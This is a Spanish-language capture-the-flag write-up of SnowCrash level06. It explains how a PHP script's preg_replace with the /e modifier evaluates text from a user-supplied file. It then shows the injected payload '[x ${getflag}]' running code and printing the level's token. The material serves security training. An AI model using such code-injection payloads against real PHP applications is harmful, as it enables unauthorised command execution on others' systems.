## Level 06

Lo primero que vemos al entrar es un ejecutable y un .php

```bash
level06@SnowCrash:~$ ls
level06  level06.php

level06.php
<?php
function y($m) { 
	$m = preg_replace("/\./", " x ", $m); 
	$m = preg_replace("/@/", " y", $m); 
	return $m; 
}
function x($y, $z) { 
	$a = file_get_contents($y); 
	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
	$a = preg_replace("/\[/", "(", $a); 
	$a = preg_replace("/\]/", ")", $a); 
	return $a; 
}
$r = x($argv[1], $argv[2]); 
print $r;
?>
```

Cuando abrimos el .php nos damos cuenta que esta tomando 2 argumentos pero solo usa el primero , ademas que del primer argumento busca en una dirección y pone en la variable el contenido del fichero , luego intenta reemplazar el contenido del fichero cambiando [] por ()

```bash
level06@SnowCrash:~$ echo '[getflag]' > /tmp/test.txt
level06@SnowCrash:~$ ./level06 /tmp/test.txt
(getflag)

```

Pero , los php tambien toman comandos. Y se pueden meter especificando de esta manera "${echo 'text'}" 

```bash
level06@SnowCrash:~$ echo '[x ${getflag}]' > /tmp/test.txt
level06@SnowCrash:~$ ./level06 /tmp/test.txt
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1
```